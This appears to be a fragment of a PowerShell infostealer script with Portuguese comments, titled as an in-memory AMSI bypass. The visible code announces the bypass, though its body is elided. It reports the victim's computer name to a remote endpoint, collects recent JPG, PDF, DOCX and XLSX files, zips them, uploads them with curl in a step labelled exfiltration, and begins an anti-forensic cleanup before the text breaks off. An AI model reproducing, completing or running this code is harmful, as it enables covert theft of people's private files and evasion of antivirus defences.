# [V32: Auditoria em Memória - Bypass AMSI ASCII]
try {
    # Reconstrução do Bypass AMSI (Invisível a scanners de texto)
    ...
    # Notificação Inicial
    curl.exe -k -s -F "content=🌑 V32 Ativo em $env:COMPUTERNAME" $u

    $tempDir = Join-Path $env:TEMP ("vol_" + (Get-Random))
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    # Busca (Documentos e Imagens < 15MB, últimos 30 dias)
    $e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
    ...
    if ((Get-ChildItem $tempDir).Count -gt 0) {
        ...
        curl.exe -k -s -F "file=@$zipFile" -F "content=📦 Exfiltração V32" $u
    }
} catch {} finally {
    # Limpeza Forense Absoluta
